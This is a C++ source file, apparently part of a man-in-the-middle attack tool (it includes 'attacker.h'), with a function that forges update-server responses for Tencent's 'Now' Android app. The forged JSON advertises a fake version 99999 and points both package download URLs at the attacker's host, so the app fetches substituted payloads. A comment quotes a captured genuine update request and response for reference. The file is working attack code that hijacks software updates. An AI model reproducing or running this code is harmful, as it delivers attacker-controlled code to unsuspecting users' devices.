


#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "qqNow.h"
#include "../version.h"
#include "../HttpUtils.h"
#include "../FileOper.h"

//sla-cn.trustlook.com

int QQNow::prepareRespData(DWORD ulIP, string filepath, string filename,string filename2) {
	int ret = FALSE;
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsonFormat = 
		"{\"message\":null,\"data\":{\"newversionno\":\"%u\",\"targetversion\":{\"content\":[{\"type\":\"4\",\"hash\":\"%s\","
		"\"url\":\"http://%s/%s\",\"size\":\"%u\",\"enablepreload\":false,\"downloadengine\":\"1\","
		"\"loadTimeoutInterval\":\"1000\",\"packageName\":\"com.tencent.now\"},{\"type\":\"3\",\"hash\":\"%s\","
		"\"url\":\"http://%s/%s\",\"size\":\"%u\",\"enablepreload\":false,\"downloadengine\":\"1\","
		"\"loadTimeoutInterval\":\"1000\",\"packageName\":\"com.tencent.now\"}],\"versionno\":%u},"
		"\"curversionno\":0,\"lazytime\":\"10000\",\"load_retry\":1,\"newversionexist\":true,\"curversionexist\":false},\"errCode\":0}";
	

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	int filesize = getUpdateFileMd5(filepath + filename, TRUE);
	if (filesize <= 0)
	{
		return FALSE;
	}
	char szmd5_1[256] = { 0 };
	memcpy(szmd5_1, m_szmd5, 32);
	int filesize1 = filesize;

	char szmd5_2[256] = { 0 };
	filesize = getUpdateFileMd5(filepath + filename2, TRUE);
	if (filesize <= 0)
	{
		return FALSE;
	}
	memcpy(szmd5_2, m_szmd5, 32);
	int filesize2 = filesize;

	int newverno = 99999;	// 39021;

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat,
		newverno, szmd5_1, szip.c_str(), filename.c_str(), filesize1,
		szmd5_2,szip.c_str(),filename2.c_str(),filesize2,newverno);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iJsonLen, lpJson);
	return m_iRespSize;
}




/*
GET /cgi-bin/now/web/version/now_ver?apptype=now&platform=2&mode=0&frameversion=9&cursdkversion=0&uin=1957001146 HTTP/1.1
Host: now.qq.com
Accept-Encoding: identity
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TAG-TL00 Build/HUAWEITAG-TL00)
Connection: Keep-Alive

HTTP/1.1 200 OK
Date: Mon, 14 Jan 2019 11:44:13 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 696
Connection: keep-alive
Server: nginx

{"message":null,"data":{"newversionno":"39021","targetversion":{"content":[{"type":"4","hash":"60feae03810a6d7ab8440f78fcd9132f",
"url":"https://pub.idqqimg.com/0315a4b371674531b9b70debb9706c4e.zip","size":"994619",
"enablepreload":false,"downloadengine":"1","loadTimeoutInterval":"1000","packageName":"com.tencent.now"},
{"type":"3","hash":"cd16aa854a0f56b8aca70c7b3e6a1def","url":"https://pub.idqqimg.com/c3300decfa4b4fcfb38b60b98526d0fb.zip",
"size":"10122353","enablepreload":false,"downloadengine":"1","loadTimeoutInterval":"1000","packageName":"com.tencent.now"}],
"versionno":39021},"curversionno":0,"lazytime":"10000","load_retry":1,"newversionexist":true,"curversionexist":false},"errCode":0}
*/